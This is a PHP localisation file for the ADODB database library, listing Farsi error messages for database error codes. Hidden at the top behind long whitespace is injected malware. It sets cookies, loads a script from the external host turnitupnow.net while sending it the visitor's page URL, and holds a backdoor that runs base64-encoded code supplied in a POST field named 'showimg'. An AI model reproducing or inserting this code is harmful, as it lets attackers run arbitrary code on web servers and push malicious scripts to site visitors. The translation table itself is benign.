<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


/* Farsi - by "Peyman Hooshmandi Raad" <phooshmand#gmail.com> */

$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'fa',
            DB_ERROR                    => 'خطای ناشناخته',
            DB_ERROR_ALREADY_EXISTS     => 'وجود دارد',
            DB_ERROR_CANNOT_CREATE      => 'امکان create وجود ندارد',
            DB_ERROR_CANNOT_DELETE      => 'امکان حذف وجود ندارد',
            DB_ERROR_CANNOT_DROP        => 'امکان drop وجود ندارد',
            DB_ERROR_CONSTRAINT         => 'نقض شرط',
            DB_ERROR_DIVZERO            => 'تقسیم بر صفر',
            DB_ERROR_INVALID            => 'نامعتبر',
            DB_ERROR_INVALID_DATE       => 'زمان یا تاریخ نامعتبر',
            DB_ERROR_INVALID_NUMBER     => 'عدد نامعتبر',
            DB_ERROR_MISMATCH           => 'عدم مطابقت',
            DB_ERROR_NODBSELECTED       => 'بانک اطلاعاتی انتخاب نشده است',
            DB_ERROR_NOSUCHFIELD        => 'چنین ستونی وجود ندارد',
            DB_ERROR_NOSUCHTABLE        => 'چنین جدولی وجود ندارد',
            DB_ERROR_NOT_CAPABLE        => 'backend بانک اطلاعاتی قادر نیست',
            DB_ERROR_NOT_FOUND          => 'پیدا نشد',
            DB_ERROR_NOT_LOCKED         => 'قفل نشده',
            DB_ERROR_SYNTAX             => 'خطای دستوری',
            DB_ERROR_UNSUPPORTED        => 'پشتیبانی نمی شود',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'شمارش مقادیر روی ردیف',
            DB_ERROR_INVALID_DSN        => 'DSN نامعتبر',
            DB_ERROR_CONNECT_FAILED     => 'ارتباط برقرار نشد',
            0	                       => 'بدون خطا', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'داده ناکافی است',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'extension پیدا نشد',
            DB_ERROR_NOSUCHDB           => 'چنین بانک اطلاعاتی وجود ندارد',
            DB_ERROR_ACCESS_VIOLATION   => 'حق دسترسی ناکافی'
);
?>